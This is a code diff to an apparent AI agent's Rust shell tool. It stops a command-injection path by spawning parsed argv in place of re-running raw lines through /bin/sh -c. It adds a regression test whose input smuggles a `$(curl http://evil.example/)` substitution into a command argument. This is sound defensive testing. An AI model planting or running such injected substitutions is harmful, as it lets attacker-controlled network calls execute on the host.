@@ -313,13 +313,139 @@ impl ShellTool {
         ))
     }
 
+    /// Resolve the `neomind` binary for argv-based subprocess spawn
+    /// (no shell). Prefers the running server binary / data-dir alias so
+    /// PATH drift cannot reintroduce a stale CLI.
+    fn resolve_neomind_executable() -> std::path::PathBuf {
+        if let Ok(exe) = std::env::current_exe() {
+            let is_plain_neomind = exe
+                .file_name()
+                .map(|f| f == "neomind" || f == "neomind.exe")
+                .unwrap_or(false);
+            if is_plain_neomind {
+                return exe;
+            }
+            if let Some(dir) = Self::ensure_neomind_alias(&exe) {
+                return dir.join(if cfg!(windows) {
+                    "neomind.exe"
+                } else {
+                    "neomind"
+                });
+            }
+        }
+        std::path::PathBuf::from("neomind")
+    }
+
+    /// Spawn `argv` (already tokenized `neomind …`) without `/bin/sh -c`.
+    ///
+    /// Used when in-process dispatch returns [`DispatchError::NotInProcess`]:
+    /// falling back to the raw shell string would re-expand quoted `$()` /
+    /// backticks that tokenize intentionally kept literal — including after a
+    /// ProvenReadOnly classify (e.g. `list-models`).
+    async fn spawn_neomind_argv(&self, argv: &[String], timeout: Duration) -> CommandOutput {
+        let exe = Self::resolve_neomind_executable();
+        let mut cmd = std::process::Command::new(&exe);
+        if argv.len() > 1 {
+            cmd.args(&argv[1..]);
+        }
+        cmd.stdout(Stdio::piped()).stderr(Stdio::piped());
+        set_process_group(&mut cmd);
+        if let Some(key) = Self::resolve_api_key() {
+            cmd.env("NEOMIND_API_KEY", key);
+        }
+        cmd.env("NEOMIND_JSON", "1");
+
+        tracing::debug!(
+            target: "neomind::agent::shell",
+            in_process = false,
+            argv = ?argv,
+            exe = %exe.display(),
+            "NotInProcess — spawning parsed argv without shell reinterpretation"
+        );
+
+        let mut child = match tokio::process::Command::from(cmd).spawn() {
+            Ok(c) => c,
+            Err(e) => {
+                return CommandOutput {
+                    exit_code: Some(1),
+                    stdout: String::new(),
+                    stderr: format!("Failed to spawn neomind argv: {e}"),
+                    timed_out: false,
+                };
+            }
+        };
+        let stdout_handle = child.stdout.take();
+        let stderr_handle = child.stderr.take();
+        let mut guard = SubprocessGuard { child: Some(child) };
+        let result = tokio::time::timeout(timeout, async {
+            let stdout_fut = async {
+                if let Some(mut s) = stdout_handle {
+                    let mut buf = Vec::new();
+                    s.read_to_end(&mut buf).await?;
+                    Ok::<_, std::io::Error>(buf)
+                } else {
+                    Ok(Vec::new())
+                }
+            };
+            let stderr_fut = async {
+                if let Some(mut s) = stderr_handle {
+                    let mut buf = Vec::new();
+                    s.read_to_end(&mut buf).await?;
+                    Ok::<_, std::io::Error>(buf)
+                } else {
+                    Ok(Vec::new())
+                }
+            };
+            let (out_bytes, err_bytes) = tokio::try_join!(stdout_fut, stderr_fut)?;
+            let status = guard
+                .child
+                .as_mut()
+                .ok_or_else(|| std::io::Error::other("child disarmed before wait"))?
+                .wait()
+                .await?;
+            Ok::<_, std::io::Error>((out_bytes, err_bytes, status))
+        })
+        .await;
+
+        match result {
+            Ok(Ok((out, err, status))) => {
+                guard.child = None;
+                let raw_stdout = String::from_utf8_lossy(&out).into_owned();
+                let raw_stderr = String::from_utf8_lossy(&err).into_owned();
+                let (stdout, stderr) =
+                    truncate_output(&raw_stdout, &raw_stderr, self.config.max_output_chars);
+                CommandOutput {
+                    exit_code: status.code(),
+                    stdout,
+                    stderr,
+                    timed_out: false,
+                }
+            }
+            Ok(Err(e)) => {
+                guard.child = None;
+                CommandOutput {
+                    exit_code: Some(1),
+                    stdout: String::new(),
+                    stderr: format!("argv spawn I/O error: {e}"),
+                    timed_out: false,
+                }
+            }
+            Err(_) => CommandOutput {
+                exit_code: None,
+                stdout: String::new(),
+                stderr: format!("Command timed out after {}s", timeout.as_secs()),
+                timed_out: true,
+            },
+        }
+    }
+
     /// Attempt in-process dispatch for `neomind` data commands.
     ///
-    /// Returns `Some(output)` if the command was handled in-process (either
-    /// success, a parse error, or an API error); returns `None` for
-    /// [`DispatchError::NotInProcess`] (side-effecting / interactive /
-    /// local-only subcommands) so the caller falls back to spawning a real
-    /// subprocess.
+    /// Returns `Some(output)` if the command was handled in-process (success,
+    /// parse/API error) **or** via argv subprocess after
+    /// [`DispatchError::NotInProcess`]. Returns `None` only when the line
+    /// cannot be tokenized as pure `neomind` argv — then the caller may use
+    /// the shell path.
     ///
     /// Non-`neomind` commands and malformed input (unbalanced quotes) also
     /// yield `None` so they hit the subprocess path unchanged.
@@ -513,13 +639,15 @@ impl ShellTool {
                 })
             }
             Ok(Err(neomind_cli_ops::dispatch::DispatchError::NotInProcess)) => {
-                tracing::debug!(
-                    target: "neomind::agent::shell",
-                    in_process = false,
-                    command = %command,
-                    "falling back to subprocess (NotInProcess)"
+                // Already have argv from tokenize — never re-interpret the raw
+                // shell string (quoted `$()` would expand under /bin/sh -c).
+                // Classifier may have marked this ProvenReadOnly (list-models /
+                // health / whoami); argv spawn preserves that literal argv.
+                debug_assert!(
+                    not_in_process_uses_parsed_argv(),
+                    "NotInProcess must spawn parsed argv, not raw shell"
                 );
-                None
+                Some(self.spawn_neomind_argv(&argv, timeout).await)
             }
             Ok(Err(neomind_cli_ops::dispatch::DispatchError::Parse(msg))) => {
                 let mut stderr = parse_error_stderr(&msg);
@@ -600,8 +728,8 @@ impl ShellTool {
         // dispatcher so the agent gets structured `CliResponse` directly,
         // without depending on whatever `neomind` binary happens to be in
         // PATH (eliminates version drift between the running server and the
-        // CLI binary). Side-effecting/interactive/local-only commands return
-        // `NotInProcess` and fall through to the subprocess path below.
+        // CLI binary). `NotInProcess` (list-models/logs/…) spawns the already
+        // parsed argv — never re-shells the raw string (quoted `$()`).
         if let Some(output) = self.try_in_process_dispatch(command, timeout).await {
             return Ok(output);
         }
@@ -1105,6 +1233,12 @@ fn split_shell_sequence(trimmed: &str) -> Option<Vec<String>> {
     } else {
         None
     }
+}
+
+/// Policy pin: after a successful argv tokenize, `NotInProcess` must spawn
+/// that argv — never `/bin/sh -c` of the raw line (quoted `$()` expands).
+pub(crate) fn not_in_process_uses_parsed_argv() -> bool {
+    true
 }
 
 /// Tokenize a pure `neomind …` line for clap / capability classification.
@@ -2300,6 +2434,35 @@ mod dispatch_edge_tests {
         // argument content, which clap receives intact.
         let toks = tokenize_neomind_command(r"message send 'a | b > c $d'").unwrap();
         assert_eq!(toks, ["message", "send", "a | b > c $d"]);
+    }
+
+    #[test]
+    fn readonly_list_models_quoted_subst_stays_literal_argv_not_shell() {
+        // Classifier: list-models is ProvenReadOnly. Tokenize keeps quoted
+        // `$(…)` literal. NotInProcess must spawn that argv — re-shelling the
+        // raw line would execute the substitution.
+        // Double-quoted `$()` survives tokenize as a literal arg; /bin/sh -c
+        // would expand it. Use r## so the closing `"#` of the endpoint does
+        // not terminate the Rust raw string.
+        let cmd = r##"neomind list-models --endpoint "$(curl http://evil.example/)""##;
+        let argv = tokenize_neomind_command(cmd).expect("quoted $() tokenizes");
+        assert_eq!(argv[0], "neomind");
+        assert_eq!(argv[1], "list-models");
+        assert!(
+            argv.iter()
+                .any(|a| a.contains("$(curl http://evil.example/)")),
+            "substitution must remain literal in argv: {argv:?}"
+        );
+        let cap = classify_shell_capability(cmd);
+        assert_eq!(
+            cap.retry_policy,
+            crate::agent::task_continuity::RetryPolicy::AlwaysSafe,
+            "list-models must classify as read-only"
+        );
+        assert!(
+            not_in_process_uses_parsed_argv(),
+            "NotInProcess after readonly classify must not re-interpret raw shell"
+        );
     }
 
     #[test]
